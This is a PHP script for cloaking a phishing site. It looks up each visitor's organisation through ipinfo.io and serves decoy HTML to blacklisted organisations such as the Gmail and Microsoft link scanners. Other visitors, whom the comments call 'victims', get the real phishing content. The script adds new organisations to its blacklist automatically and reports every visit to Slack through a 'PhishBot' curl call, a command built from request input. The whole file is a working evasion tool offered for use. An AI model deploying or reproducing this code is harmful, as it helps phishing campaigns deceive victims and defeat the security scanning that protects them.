<?php

//AutoBlock Mode "true" means every IP but yours will get auto-added to the blacklist
// "false" means everyone is allowed except if they're on the blacklist
$AutoBlock = false;
// Your public IP (your client)        ************** MAKE SURE YOU SET THIS ****************
$myip = "YOUR_IP_HERE";

// Gets URI that's accessed
$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

// Determines if the URI is an IP or Domain (blocks if IP)
$parts = parse_url($url);
$isIP = (bool)ip2long($parts['host']);

$allowed = "- *Accessed Phishing Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];

// Can set your IP manually to see what Google sees
//$ip = "8.8.8.8";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$org = $details->org;

// List of Orgs to be Blacklisted
$filename = "/var/www/html/blacklist.txt";

// Open the file
$fp = @fopen($filename, 'r'); 

// Add each line to an array
if ($fp) {
   $blockorgs = explode("\r\n", fread($fp, filesize($filename)));
}

// AutoBlock Function
if ($AutoBlock == true && $ip != $myip && $isIP == false){
$txt = explode(' ', $org, 2)[1];

if(!in_array($txt, $blockorgs)){
	
$myfile = fopen("/var/www/html/blacklist.txt", "a") or die("Unable to open file!");
fwrite($myfile, "\r\n". $txt);
fclose($myfile);
array_push($blockorgs, $txt);
}
}

//Block via blacklist
if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true OR $org == "") {

// Content for Orgs to see on the Blacklist
// Point this to file containing HTML you want the blacklisters to see
$fakehtml = file_get_contents('/var/www/html/fakecontent.html');
echo $fakehtml;

// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
//header('HTTP/1.0 404 not found'); 
  
$allowed = "- *Jedi Mind Trick Successful* -";

} else {

// Content for victims to see (not on the blacklist)
// Point this to file containing HTML you want the victims to see
$realhtml = file_get_contents('/var/www/html/realcontent.php');
echo $realhtml;

$allowed = "- *Allowed* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
}

// Set Slack Information Here       ************** MAKE SURE YOU SET THIS ****************
if($jedi == 1){$webhookurl = "https://hooks.slack.com/services/BLOCKED_CHANNEL_WEBHOOK_HERE";}else{$webhookurl = "https://hooks.slack.com/services/ALLOWED_CHANNEL_WEBHOOK_HERE";}

$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$channel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' '.$webhookurl;
//echo $cmd;
exec($cmd);

// You Can Uncomment If You Want to Use a Database to Capture Requests (ask me for stored procedure)
//$conn = mysqli_connect('127.0.0.1', 'USERNAME', 'PASSWORD', 'phishbypass');
//// Check connection
//if ($conn->connect_error) {
//    die("Connection failed: " . $conn->connect_error);
//}

//$sql = "CALL InsertData('$ip','$id','$org','$jedi','$url');";
//$result = $conn->query($sql);

//printf($conn->error);
//$conn->close();


?>

















